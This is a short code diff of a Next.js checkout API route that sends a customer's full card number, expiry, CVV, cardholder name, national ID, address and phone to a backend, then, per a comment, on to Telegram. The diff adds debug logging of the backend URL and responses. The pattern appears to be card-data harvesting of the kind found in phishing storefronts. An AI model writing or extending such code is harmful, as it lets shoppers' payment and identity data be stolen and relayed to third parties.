@@ -8,12 +8,18 @@ export async function POST(req: NextRequest) {
 
   // حفظ في الداتابيز
   try {
-    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+    const backendUrl = process.env.BACKEND_URL;
+    console.log("[notify] BACKEND_URL:", backendUrl);
+    const saveRes = await fetch(`${backendUrl}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
-  } catch {}
+    const saveJson = await saveRes.json();
+    console.log("[notify] save response:", JSON.stringify(saveJson));
+  } catch (e) {
+    console.error("[notify] save error:", e);
+  }
 
   // Send Telegram
   const ltr = "\u200E";
